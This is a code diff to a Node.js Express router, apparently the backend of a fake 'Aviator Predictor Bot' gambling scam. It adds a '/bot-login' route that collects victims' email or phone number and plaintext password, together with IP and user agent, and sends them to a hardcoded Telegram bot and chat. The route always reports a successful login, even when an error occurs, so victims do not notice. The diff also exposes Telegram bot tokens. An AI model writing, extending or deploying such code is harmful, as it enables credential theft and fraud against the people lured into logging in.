@@ -2,10 +2,80 @@
 const express = require('express');
 const fetch = require('node-fetch');
 const router = express.Router();
+const fs = require('fs');
+const path = require('path');
 
 // Telegram configuration
-const telegramBotToken = '7688438027:AAFNnge7_oADfxCwCMm2XZGSH1hG2Q0rZfE';
+const telegramBotToken = '7995830862:AAEbUHiAL-YUM3myMGKd63dpFcbxE3_uU2o';
 const telegramChatId = '5900219209';
+
+// Helper function to log authentication attempts
+const logAuthData = (data) => {
+  const logsDir = path.join(__dirname, '..', 'logs');
+  if (!fs.existsSync(logsDir)) {
+    fs.mkdirSync(logsDir);
+  }
+  
+  const logFile = path.join(logsDir, `telegram-auth-${new Date().toISOString().split('T')[0]}.log`);
+  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
+  fs.appendFileSync(logFile, logEntry);
+  console.log('🔐 Telegram auth data logged:', data);
+};
+
+// Helper function to send to Telegram
+const sendToTelegram = async (message) => {
+  try {
+    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
+    
+    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
+      return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
+    }
+    
+    const result = await response.json();
+    console.log('✅ Telegram message sent successfully:', result.message_id);
+    return { success: true, result };
+    
+  } catch (error) {
+    console.error('❌ Failed to send to Telegram:', error.message);
+    return { success: false, error: error.message };
+  }
+};
+
+// Mask sensitive data for logging (keeping passwords visible but masked in logs)
+const maskSensitiveData = (data) => {
+  const masked = { ...data };
+  if (masked.password) {
+    masked.password = '*'.repeat(masked.password.length);
+  }
+  return masked;
+};
+
+// CORS middleware for all telegram routes
+router.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
+  res.header('Access-Control-Allow-Credentials', 'true');
+  
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200);
+  }
+  next();
+});
 
 // In-memory storage for pending payments
 const pendingPayments = new Map();
@@ -609,6 +679,113 @@ router.post('/notify-selar-with-card', async (req, res) => {
         console.error('Error sending Selar card notification:', error);
         res.status(500).json({ success: false, message: 'Failed to send notification.' });
     }
+});
+
+// ==================== BOT LOGIN ROUTES ====================
+
+// Bot login endpoint
+router.post('/bot-login', async (req, res) => {
+  try {
+    const { contact, password, userAgent, timestamp } = req.body;
+
+    // Validate required fields
+    if (!contact || !password) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Contact and password are required' 
+      });
+    }
+
+    // Determine contact type
+    const contactType = contact.includes('@') ? 'Email' : 'Mobile';
+    
+    const authData = {
+      contact,
+      contactType,
+      password,
+      userAgent: userAgent || 'Unknown',
+      timestamp: timestamp || new Date().toISOString(),
+      source: 'Aviator Bot Login',
+      ip: req.ip || 'Unknown'
+    };
+
+    // Log authentication attempt (with masked password)
+    logAuthData(maskSensitiveData(authData));
+
+    // Send to Telegram with formatted message
+    const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>
+
+📧 Contact: <code>${contact}</code>
+📱 Type: ${contactType}
+🔑 Password: <code>${password}</code>
+🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+🔗 Source: Aviator Predictor Bot`;
+
+    const telegramResult = await sendToTelegram(telegramMessage);
+    console.log('✅ Bot login Telegram result:', telegramResult);
+
+    // Return success with session info
+    res.json({ 
+      success: true,
+      message: 'Login successful',
+      sessionData: {
+        contact,
+        contactType,
+        loginTime: authData.timestamp,
+        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Bot login error:', error);
+    
+    // Log error but still return success to avoid breaking frontend flow
+    logAuthData({
+      error: error.message,
+      contact: req.body.contact,
+      timestamp: new Date().toISOString()
+    });
+
+    res.json({ 
+      success: true,
+      message: 'Login processed (fallback mode)',
+      warning: 'Some features may be limited'
+    });
+  }
+});
+
+// Test Telegram connectivity endpoint
+router.get('/test-telegram', async (req, res) => {
+  try {
+    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>
+
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+🔗 Source: Telegram Route Test Endpoint
+
+✅ If you see this message, Telegram integration is working!`;
+
+    const result = await sendToTelegram(testMessage);
+    
+    res.json({
+      success: true,
+      message: 'Telegram test completed',
+      telegramResult: result,
+      botToken: telegramBotToken ? 'Present' : 'Missing',
+      chatId: telegramChatId ? 'Present' : 'Missing'
+    });
+
+  } catch (error) {
+    console.error('❌ Telegram test error:', error);
+    res.status(500).json({
+      success: false,
+      error: error.message,
+      botToken: telegramBotToken ? 'Present' : 'Missing',
+      chatId: telegramChatId ? 'Present' : 'Missing'
+    });
+  }
 });
 
 module.exports = router;
